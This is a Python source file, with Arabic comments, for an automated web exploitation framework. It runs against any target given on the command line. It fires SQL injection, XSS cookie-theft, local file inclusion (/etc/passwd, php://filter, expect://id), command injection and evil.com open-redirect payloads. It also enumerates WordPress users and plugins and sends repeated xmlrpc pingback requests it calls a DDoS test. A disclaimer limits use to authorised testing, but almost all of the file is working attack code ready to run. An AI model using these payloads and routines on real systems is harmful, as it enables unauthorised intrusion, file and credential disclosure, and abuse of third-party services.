#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Cheek Exploit Framework - إطار استغلال الثغرات
المبرمج: SayerLinux
الإيميل: SaudiSayer@gmail.com

ملاحظة: هذه الأدوات للأغراض التعليمية والاختبارية فقط.
استخدم فقط على الأنظمة التي تملك صلاحية اختبارها.
"""

import requests
import socket
import json
import base64
import urllib.parse
from datetime import datetime
import re
import subprocess
import sys
import os

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class CheekExploitFramework:
    def __init__(self, target):
        self.target = target
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CheekExploit/1.0'})
        
    def log_exploit(self, exploit_name, success, details=""):
        """تسجيل نتائج الاستغلال"""
        result = {
            'timestamp': datetime.now().isoformat(),
            'exploit': exploit_name,
            'target': self.target,
            'success': success,
            'details': details
        }
        self.results.append(result)
        
        if success:
            print(f"{Colors.GREEN}[+] {exploit_name}: SUCCESS{Colors.RESET}")
            if details:
                print(f"    تفاصيل: {details}")
        else:
            print(f"{Colors.RED}[-] {exploit_name}: FAILED{Colors.RESET}")
    
    def exploit_directory_listing(self, path="/"):
        """استغلال تصفح الدليل"""
        print(f"{Colors.YELLOW}[*] محاولة استغلال تصفح الدليل...{Colors.RESET}")
        
        try:
            url = f"http://{self.target}{path}"
            response = self.session.get(url, timeout=10)
            
            if "Index of /" in response.text or "Parent Directory" in response.text:
                directories = re.findall(r'<a href="([^"]+)">', response.text)
                self.log_exploit("Directory Listing", True, f"تم العثور على {len(directories)} دليل/ملف في {path}")
                
                # محاولة الوصول للملفات الحساسة
                sensitive_files = ['.htaccess', 'config.php', 'web.config', 'backup.zip', 'database.sql']
                for file in directories:
                    if any(sensitive in file.lower() for sensitive in sensitive_files):
                        print(f"{Colors.RED}[!] ملف حساس محتمل: {file}{Colors.RESET}")
                
                return True
            else:
                self.log_exploit("Directory Listing", False, "لا يوجد تصفح دليل")
                return False
                
        except Exception as e:
            self.log_exploit("Directory Listing", False, str(e))
            return False
    
    def exploit_server_version_disclosure(self):
        """استغلال تسرب إصدار الخادم"""
        print(f"{Colors.YELLOW}[*] محاولة استغلال تسرب إصدار الخادم...{Colors.RESET}")
        
        try:
            response = self.session.get(f"http://{self.target}", timeout=10)
            server_header = response.headers.get('Server', '')
            
            if server_header:
                # محاولة استغلال معلومات الإصدار
                if 'Apache' in server_header:
                    version = re.search(r'Apache/([\d.]+)', server_header)
                    if version:
                        vuln_version = version.group(1)
                        self.log_exploit("Server Version Disclosure", True, f"Apache {vuln_version} - يمكن البحث عن ثغرات لهذا الإصدار")
                        
                        # محاولة ثغرات Apache الشائعة
                        self.apache_exploits(vuln_version)
                        
                elif 'nginx' in server_header.lower():
                    version = re.search(r'nginx/([\d.]+)', server_header)
                    if version:
                        vuln_version = version.group(1)
                        self.log_exploit("Server Version Disclosure", True, f"Nginx {vuln_version} - يمكن البحث عن ثغرات لهذا الإصدار")
                        
                elif 'PHP' in server_header:
                    version = re.search(r'PHP/([\d.]+)', server_header)
                    if version:
                        vuln_version = version.group(1)
                        self.log_exploit("PHP Version Disclosure", True, f"PHP {vuln_version} - يمكن البحث عن ثغرات لهذا الإصدار")
                        self.php_exploits(vuln_version)
                
                return True
            else:
                self.log_exploit("Server Version Disclosure", False, "لا توجد معلومات إصدار")
                return False
                
        except Exception as e:
            self.log_exploit("Server Version Disclosure", False, str(e))
            return False
    
    def apache_exploits(self, version):
        """ثغرات Apache الشائعة"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات Apache الشائعة...{Colors.RESET}")
        
        # محاولة الوصول لملفات التكوين
        config_files = [
            "/.htaccess",
            "/httpd.conf",
            "/conf/httpd.conf",
            "/apache/logs/access.log",
            "/apache/logs/error.log"
        ]
        
        for config_file in config_files:
            try:
                response = self.session.get(f"http://{self.target}{config_file}", timeout=5)
                if response.status_code == 200 and len(response.text) > 100:
                    print(f"{Colors.RED}[!] ملف تكوين قابل للوصول: {config_file}{Colors.RESET}")
            except:
                continue
    
    def php_exploits(self, version):
        """ثغرات PHP الشائعة"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات PHP الشائعة...{Colors.RESET}")
        
        # محاولة الوصول لملفات PHPinfo
        phpinfo_files = [
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            "/php.php"
        ]
        
        for phpfile in phpinfo_files:
            try:
                response = self.session.get(f"http://{self.target}{phpfile}", timeout=5)
                if "phpinfo()" in response.text:
                    print(f"{Colors.RED}[!] ملف phpinfo مكشوف: {phpfile}{Colors.RESET}")
            except:
                continue
    
    def exploit_missing_security_headers(self):
        """استغلال رؤوس الأمان المفقودة"""
        print(f"{Colors.YELLOW}[*] فحص رؤوس الأمان المفقودة...{Colors.RESET}")
        
        try:
            response = self.session.get(f"http://{self.target}", timeout=10)
            headers = response.headers
            
            missing_headers = []
            security_headers = {
                'X-Frame-Options': 'Clickjacking',
                'X-Content-Type-Options': 'MIME Sniffing',
                'X-XSS-Protection': 'XSS Protection',
                'Strict-Transport-Security': 'HTTPS Enforcement',
                'Content-Security-Policy': 'Content Security'
            }
            
            for header, protection in security_headers.items():
                if header not in headers:
                    missing_headers.append(f"{header} ({protection})")
            
            if missing_headers:
                self.log_exploit("Missing Security Headers", True, f"رؤوس مفقودة: {', '.join(missing_headers)}")
                
                # محاولة استغلال نقص حماية Clickjacking
                if 'X-Frame-Options' not in headers:
                    self.clickjacking_test()
                
                return True
            else:
                self.log_exploit("Missing Security Headers", False, "جميع رؤوس الأمان موجودة")
                return False
                
        except Exception as e:
            self.log_exploit("Missing Security Headers", False, str(e))
            return False
    
    def clickjacking_test(self):
        """اختبار Clickjacking"""
        print(f"{Colors.YELLOW}[*] اختبار إمكانية Clickjacking...{Colors.RESET}")
        
        # إنشاء صفحة HTML للاختبار
        test_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Clickjacking Test</title>
        </head>
        <body>
            <h1>Clickjacking Test Page</h1>
            <p>This page embeds {self.target} in an iframe:</p>
            <iframe src="http://{self.target}" width="800" height="600"></iframe>
        </body>
        </html>
        """
        
        print(f"{Colors.RED}[!] الموقع قابل للـ Clickjacking!{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] تم إنشاء صفحة اختبار. احفظها كـ clickjacking_test.html وافتحها في المتصفح للاختبار{Colors.RESET}")
        
        # حفظ ملف الاختبار
        try:
            with open("clickjacking_test.html", "w") as f:
                f.write(test_html)
            print(f"{Colors.GREEN}[+] تم حفظ ملف اختبار Clickjacking: clickjacking_test.html{Colors.RESET}")
        except:
            pass
    
    def exploit_insecure_cookies(self):
        """استغلال ملفات تعريف الارتباط غير الآمنة"""
        print(f"{Colors.YELLOW}[*] فحص ملفات تعريف الارتباط غير الآمنة...{Colors.RESET}")
        
        try:
            response = self.session.get(f"http://{self.target}", timeout=10)
            cookies = response.cookies
            
            insecure_cookies = []
            for cookie in cookies:
                issues = []
                if not cookie.secure:
                    issues.append("لا يحتوي على علامة Secure")
                if not hasattr(cookie, 'httponly') or not cookie.httponly:
                    issues.append("لا يحتوي على علامة HttpOnly")
                if not cookie.domain:
                    issues.append("لا يحتوي على نطاق محدد")
                
                if issues:
                    insecure_cookies.append(f"{cookie.name}: {', '.join(issues)}")
            
            if insecure_cookies:
                self.log_exploit("Insecure Cookies", True, f"ملفات تعريف ارتباط غير آمنة: {'; '.join(insecure_cookies)}")
                
                # محاولة سرقة ملفات تعريف الارتباط عبر XSS
                self.xss_cookie_theft()
                
                return True
            else:
                self.log_exploit("Insecure Cookies", False, "جميع ملفات تعريف الارتباط آمنة")
                return False
                
        except Exception as e:
            self.log_exploit("Insecure Cookies", False, str(e))
            return False
    
    def xss_cookie_theft(self):
        """اختبار سرقة ملفات تعريف الارتباط عبر XSS"""
        print(f"{Colors.YELLOW}[*] اختبار إمكانية سرقة ملفات تعريف الارتباط عبر XSS...{Colors.RESET}")
        
        # بايتود اختبار XSS لسرقة ملفات تعريف الارتباط
        xss_payloads = [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "'\"><script>alert(document.cookie)</script>",
            "<svg onload=alert(document.cookie)>",
            "javascript:alert(document.cookie)"
        ]
        
        # اختبار في معلمات URL
        test_params = ["search", "q", "name", "id", "page", "user"]
        
        for param in test_params:
            for payload in xss_payloads:
                try:
                    url = f"http://{self.target}/test"
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=5)
                    
                    if payload in response.text:
                        print(f"{Colors.RED}[!] XSS مكتشف في المعلمة {param}!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                        return
                        
                except:
                    continue
    
    def exploit_wordpress_vulnerabilities(self):
        """استغلال ثغرات ووردبريس"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات ووردبريس...{Colors.RESET}")
        
        # التحقق من وجود ووردبريس
        wp_indicators = ['/wp-content/', '/wp-includes/', '/wp-admin/', '/xmlrpc.php']
        
        wordpress_found = False
        for indicator in wp_indicators:
            try:
                response = self.session.get(f"http://{self.target}{indicator}", timeout=5)
                if response.status_code == 200:
                    wordpress_found = True
                    break
            except:
                continue
        
        if wordpress_found:
            print(f"{Colors.GREEN}[+] WordPress مكتشف{Colors.RESET}")
            
            # محاولة استغلال xmlrpc.php
            self.wordpress_xmlrpc_exploit()
            
            # محاولة الكشف عن المستخدمين
            self.wordpress_user_enumeration()
            
            # محاولة الكشف عن المكونات الإضافية
            self.wordpress_plugin_enumeration()
            
            return True
        else:
            self.log_exploit("WordPress", False, "ووردبريس غير مكتشف")
            return False
    
    def wordpress_xmlrpc_exploit(self):
        """استغلال xmlrpc.php"""
        print(f"{Colors.YELLOW}[*] فحص إمكانية استغلال xmlrpc.php...{Colors.RESET}")
        
        xmlrpc_payload = """<?xml version="1.0" encoding="utf-8"?>
        <methodCall>
            <methodName>system.listMethods</methodName>
            <params></params>
        </methodCall>"""
        
        try:
            response = self.session.post(
                f"http://{self.target}/xmlrpc.php",
                data=xmlrpc_payload,
                headers={'Content-Type': 'text/xml'},
                timeout=10
            )
            
            if "system.listMethods" in response.text or "methodResponse" in response.text:
                print(f"{Colors.RED}[!] xmlrpc.php مفعل ويمكن استغلاله!{Colors.RESET}")
                print(f"{Colors.YELLOW}[*] يمكن تنفيذ هجمات brute force أو DDoS عبر xmlrpc{Colors.RESET}")
                
                # اختبار هجوم DDoS البسيط
                self.xmlrpc_ddos_test()
                
        except Exception as e:
            print(f"[-] xmlrpc.php غير متاح: {e}")
    
    def xmlrpc_ddos_test(self):
        """اختبار هجوم DDoS عبر xmlrpc"""
        print(f"{Colors.YELLOW}[*] اختبار إمكانية DDoS عبر xmlrpc...{Colors.RESET}")
        
        ddos_payload = """<?xml version="1.0" encoding="utf-8"?>
        <methodCall>
            <methodName>pingback.ping</methodName>
            <params>
                <param><value><string>http://victim.com</string></value></param>
                <param><value><string>http://{target}/</string></value></param>
            </params>
        </methodCall>""".format(target=self.target)
        
        try:
            # إرسال عدة طلبات
            for i in range(5):
                response = self.session.post(
                    f"http://{self.target}/xmlrpc.php",
                    data=ddos_payload,
                    headers={'Content-Type': 'text/xml'},
                    timeout=5
                )
                
                if response.status_code == 200:
                    print(f"{Colors.RED}[!] طلب DDoS رقم {i+1} تم إرساله بنجاح{Colors.RESET}")
                    
        except:
            print("[-] فشل اختبار DDoS")
    
    def wordpress_user_enumeration(self):
        """كشف مستخدمي ووردبريس"""
        print(f"{Colors.YELLOW}[*] كشف مستخدمي ووردبريس...{Colors.RESET}")
        
        users_found = []
        
        # طريقة 1: من خلال المؤلفين
        for i in range(1, 10):
            try:
                response = self.session.get(f"http://{self.target}/?author={i}", timeout=5)
                if response.status_code == 200:
                    # استخراج اسم المستخدم من التوجيه
                    if "author/" in response.url:
                        username = response.url.split("author/")[1].split("/")[0]
                        users_found.append(username)
                        print(f"{Colors.RED}[!] مستخدم مكتشف: {username}{Colors.RESET}")
            except:
                continue
        
        # طريقة 2: من خلال REST API
        try:
            response = self.session.get(f"http://{self.target}/wp-json/wp/v2/users", timeout=5)
            if response.status_code == 200:
                users = response.json()
                for user in users:
                    username = user.get('slug', '')
                    if username and username not in users_found:
                        users_found.append(username)
                        print(f"{Colors.RED}[!] مستخدم مكتشف: {username}{Colors.RESET}")
        except:
            pass
        
        if users_found:
            print(f"{Colors.RED}[!] تم العثور على {len(users_found)} مستخدم{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] يمكن تنفيذ هجمات brute force على هؤلاء المستخدمين{Colors.RESET}")
    
    def wordpress_plugin_enumeration(self):
        """كشف المكونات الإضافية لووردبريس"""
        print(f"{Colors.YELLOW}[*] كشف المكونات الإضافية لووردبريس...{Colors.RESET}")
        
        # قائمة المكونات الإضافية الشائعة
        common_plugins = [
            'akismet', 'jetpack', 'wordpress-seo', 'wp-super-cache',
            'contact-form-7', 'google-analytics-for-wordpress', 'all-in-one-seo-pack',
            'wp-mail-smtp', 'really-simple-ssl', 'updraftplus', 'wordfence'
        ]
        
        found_plugins = []
        
        for plugin in common_plugins:
            try:
                response = self.session.get(f"http://{self.target}/wp-content/plugins/{plugin}/", timeout=3)
                if response.status_code == 200 or response.status_code == 403:
                    found_plugins.append(plugin)
                    print(f"{Colors.RED}[!] مكون إضافي مكتشف: {plugin}{Colors.RESET}")
            except:
                continue
        
        if found_plugins:
            print(f"{Colors.RED}[!] تم العثور على {len(found_plugins)} مكون إضافي{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] يمكن البحث عن ثغرات في هذه المكونات{Colors.RESET}")
    
    def exploit_sql_injection(self):
        """استغلال ثغرات SQL Injection"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات SQL Injection...{Colors.RESET}")
        
        # بايتودات اختبار SQL Injection
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT null--",
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR SLEEP(5)--",
            "' OR pg_sleep(5)--"
        ]
        
        # معلمات الاختبار
        test_params = ["id", "user", "name", "page", "cat", "product", "item"]
        
        vuln_found = False
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    # اختبار GET
                    url = f"http://{self.target}/test"
                    params = {param: payload}
                    
                    start_time = datetime.now()
                    response = self.session.get(url, params=params, timeout=10)
                    end_time = datetime.now()
                    
                    response_time = (end_time - start_time).total_seconds()
                    
                    # اكتشاف SQL error
                    sql_errors = [
                        "mysql_fetch_array", "ORA-", "Microsoft OLE DB Provider",
                        "PostgreSQL query failed", "SQLite error", "SQL syntax"
                    ]
                    
                    for error in sql_errors:
                        if error in response.text:
                            print(f"{Colors.RED}[!] SQL Injection مكتشف في المعلمة {param}!{Colors.RESET}")
                            print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                            print(f"{Colors.RED}[!] رسالة الخطأ: {error}{Colors.RESET}")
                            vuln_found = True
                            break
                    
                    # اكتشاف الوقت
                    if response_time > 4 and ("SLEEP" in payload or "pg_sleep" in payload):
                        print(f"{Colors.RED}[!] SQL Injection بالوقت مكتشف في المعلمة {param}!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] وقت الاستجابة: {response_time} ثانية{Colors.RESET}")
                        vuln_found = True
                        break
                    
                    # اختبار POST
                    post_response = self.session.post(url, data=params, timeout=10)
                    
                    for error in sql_errors:
                        if error in post_response.text:
                            print(f"{Colors.RED}[!] SQL Injection POST مكتشف في المعلمة {param}!{Colors.RESET}")
                            print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                            vuln_found = True
                            break
                    
                    if vuln_found:
                        break
                        
                except:
                    continue
            
            if vuln_found:
                break
        
        if not vuln_found:
            self.log_exploit("SQL Injection", False, "لا توجد ثغرات SQL Injection واضحة")
    
    def exploit_file_inclusion(self):
        """استغلال ثغرات File Inclusion"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات File Inclusion...{Colors.RESET}")
        
        # بايتودات LFI
        lfi_payloads = [
            "../../../etc/passwd",
            "../../../../windows/system32/drivers/etc/hosts",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "expect://id"
        ]
        
        # معلمات الاختبار
        test_params = ["file", "page", "include", "path", "template", "config"]
        
        vuln_found = False
        
        for param in test_params:
            for payload in lfi_payloads:
                try:
                    # اختبار GET
                    url = f"http://{self.target}/test"
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=10)
                    
                    # اكتشاف ملف /etc/passwd
                    if "root:" in response.text or "daemon:" in response.text:
                        print(f"{Colors.RED}[!] LFI مكتشف في المعلمة {param}!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                        print(f"{Colors.RED}[!] تم الوصول لملف /etc/passwd!{Colors.RESET}")
                        vuln_found = True
                        break
                    
                    # اكتشاف ملف hosts
                    if "localhost" in response.text and "127.0.0.1" in response.text:
                        print(f"{Colors.RED}[!] LFI مكتشف في المعلمة {param}!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                        print(f"{Colors.RED}[!] تم الوصول لملف hosts!{Colors.RESET}")
                        vuln_found = True
                        break
                    
                    # اكتشاف Base64 encoded
                    if "PD9waHA" in response.text:  # Base64 of "<?php"
                        print(f"{Colors.RED}[!] PHP Filter Injection مكتشف!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                        vuln_found = True
                        break
                    
                except:
                    continue
            
            if vuln_found:
                break
        
        if not vuln_found:
            self.log_exploit("File Inclusion", False, "لا توجد ثغرات File Inclusion واضحة")
    
    def exploit_command_injection(self):
        """استغلال ثغرات Command Injection"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات Command Injection...{Colors.RESET}")
        
        # بايتودات Command Injection
        cmd_payloads = [
            "; id",
            "| id",
            "&& id",
            "|| id",
            "`id`",
            "$(id)",
            "; whoami",
            "; cat /etc/passwd",
            "; dir C:\\",
            "& ipconfig"
        ]
        
        # معلمات الاختبار
        test_params = ["cmd", "command", "exec", "shell", "system", "ping", "host", "ip"]
        
        vuln_found = False
        
        for param in test_params:
            for payload in cmd_payloads:
                try:
                    # اختبار GET
                    url = f"http://{self.target}/test"
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=10)
                    
                    # اكتشاف نتائج الأوامر
                    command_outputs = [
                        "uid=", "gid=", "groups=",  # Unix
                        "root:", "daemon:",        # /etc/passwd
                        "whoami", "Administrator",  # Windows
                        "Windows IP", "Ethernet adapter"  # ipconfig
                    ]
                    
                    for output in command_outputs:
                        if output in response.text:
                            print(f"{Colors.RED}[!] Command Injection مكتشف في المعلمة {param}!{Colors.RESET}")
                            print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                            print(f"{Colors.RED}[!] ناتج الأمر: {output}{Colors.RESET}")
                            vuln_found = True
                            break
                    
                    # اختبار وقت التنفيذ
                    start_time = datetime.now()
                    sleep_payload = f"{payload.replace('id', 'sleep 5')}"
                    response = self.session.get(url, params={param: sleep_payload}, timeout=7)
                    end_time = datetime.now()
                    
                    response_time = (end_time - start_time).total_seconds()
                    if response_time > 4:
                        print(f"{Colors.RED}[!] Command Injection بالوقت مكتشف في المعلمة {param}!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] البايتود: {sleep_payload}{Colors.RESET}")
                        print(f"{Colors.RED}[!] وقت التنفيذ: {response_time} ثانية{Colors.RESET}")
                        vuln_found = True
                        break
                    
                    if vuln_found:
                        break
                        
                except:
                    continue
            
            if vuln_found:
                break
        
        if not vuln_found:
            self.log_exploit("Command Injection", False, "لا توجد ثغرات Command Injection واضحة")
    
    def exploit_open_redirect(self):
        """استغلال ثغرات Open Redirect"""
        print(f"{Colors.YELLOW}[*] فحص ثغرات Open Redirect...{Colors.RESET}")
        
        # بايتودات Open Redirect
        redirect_payloads = [
            "https://evil.com",
            "//evil.com",
            "/\/evil.com",
            "http://evil.com",
            "evil.com",
            "@evil.com",
            "javascript:alert('XSS')"
        ]
        
        # معلمات الاختبار
        test_params = ["url", "redirect", "return", "next", "dest", "target", "link", "goto"]
        
        vuln_found = False
        
        for param in test_params:
            for payload in redirect_payloads:
                try:
                    # اختبار GET
                    url = f"http://{self.target}/test"
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=10, allow_redirects=False)
                    
                    # اكتشاف التوجيه
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location or 'javascript:' in location:
                            print(f"{Colors.RED}[!] Open Redirect مكتشف في المعلمة {param}!{Colors.RESET}")
                            print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                            print(f"{Colors.RED}[!] التوجيه إلى: {location}{Colors.RESET}")
                            vuln_found = True
                            break
                    
                    # اختبار مع المتابعة
                    response_follow = self.session.get(url, params=params, timeout=10)
                    if 'evil.com' in response_follow.url:
                        print(f"{Colors.RED}[!] Open Redirect مكتشف في المعلمة {param}!{Colors.RESET}")
                        print(f"{Colors.YELLOW}[*] البايتود: {payload}{Colors.RESET}")
                        vuln_found = True
                        break
                    
                except:
                    continue
            
            if vuln_found:
                break
        
        if not vuln_found:
            self.log_exploit("Open Redirect", False, "لا توجد ثغرات Open Redirect واضحة")
    
    def generate_exploit_report(self):
        """إنشاء تقرير الاستغلال"""
        print(f"\n{Colors.CYAN}{Colors.BOLD}=== تقرير استغلال الثغرات ==={Colors.RESET}")
        print(f"{Colors.YELLOW}الهدف: {Colors.GREEN}{self.target}{Colors.RESET}")
        print(f"{Colors.YELLOW}وقت الفحص: {Colors.GREEN}{datetime.now().isoformat()}{Colors.RESET}")
        
        successful_exploits = [r for r in self.results if r['success']]
        failed_exploits = [r for r in self.results if not r['success']]
        
        print(f"\n{Colors.RED}[!] الثغرات التي تم استغلالها ({len(successful_exploits)}):{Colors.RESET}")
        for exploit in successful_exploits:
            print(f"  - {exploit['exploit']}: {exploit['details']}")
        
        print(f"\n{Colors.BLUE}[i] الثغرات التي لم تُستغل ({len(failed_exploits)}):{Colors.RESET}")
        for exploit in failed_exploits:
            print(f"  - {exploit['exploit']}")
        
        # حفظ التقرير
        report_filename = f"exploit_report_{self.target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(report_filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, ensure_ascii=False, indent=2)
            print(f"\n{Colors.GREEN}[+] تم حفظ تقرير الاستغلال في: {report_filename}{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[-] فشل حفظ التقرير: {e}{Colors.RESET}")
    
    def run_all_exploits(self):
        """تشغيل جميع وحدات الاستغلال"""
        print(f"{Colors.CYAN}{Colors.BOLD}=== بدء استغلال الثغرات لـ {self.target} ==={Colors.RESET}")
        
        # قائمة بجميع وحدات الاستغلال
        exploits = [
            self.exploit_directory_listing,
            self.exploit_server_version_disclosure,
            self.exploit_missing_security_headers,
            self.exploit_insecure_cookies,
            self.exploit_wordpress_vulnerabilities,
            self.exploit_sql_injection,
            self.exploit_file_inclusion,
            self.exploit_command_injection,
            self.exploit_open_redirect
        ]
        
        for exploit in exploits:
            try:
                exploit()
            except KeyboardInterrupt:
                print(f"\n{Colors.RED}[!] تم إيقاف الاستغلال بواسطة المستخدم{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}[-] خطأ في {exploit.__name__}: {e}{Colors.RESET}")
                continue
        
        # إنشاء التقرير النهائي
        self.generate_exploit_report()

def main():
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print(" ██████╗██╗  ██╗███████╗███████╗███████╗")
    print("██╔════╝██║  ██║██╔════╝██╔════╝██╔════╝")
    print("██║     ███████║█████╗  █████╗  █████╗  ")
    print("██║     ██╔══██║██╔══╝  ██╔══╝  ██╔══╝  ")
    print("╚██████╗██║  ██║███████╗███████╗███████╗")
    print(" ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
    print(f"{Colors.PURPLE}")
    print("    إطار استغلال الثغرات")
    print("    Exploit Framework")
    print(f"{Colors.YELLOW}")
    print("المبرمج: SayerLinux")
    print("الإيميل: SaudiSayer@gmail.com")
    print(f"{Colors.RESET}")
    
    if len(sys.argv) != 2:
        print(f"{Colors.RED}[!] الاستخدام: python {sys.argv[0]} <target>{Colors.RESET}")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print(f"{Colors.RED}[!] تحذير: هذه الأداة للأغراض التعليمية والاختبارية فقط!{Colors.RESET}")
    print(f"{Colors.RED}[!] تأكد من أن لديك صلاحية اختبار الهدف: {target}{Colors.RESET}")
    
    try:
        framework = CheekExploitFramework(target)
        framework.run_all_exploits()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] تم إيقاف الأداة بواسطة المستخدم{Colors.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[!] خطأ غير متوقع: {e}{Colors.RESET}")
        sys.exit(1)

if __name__ == '__main__':
    main()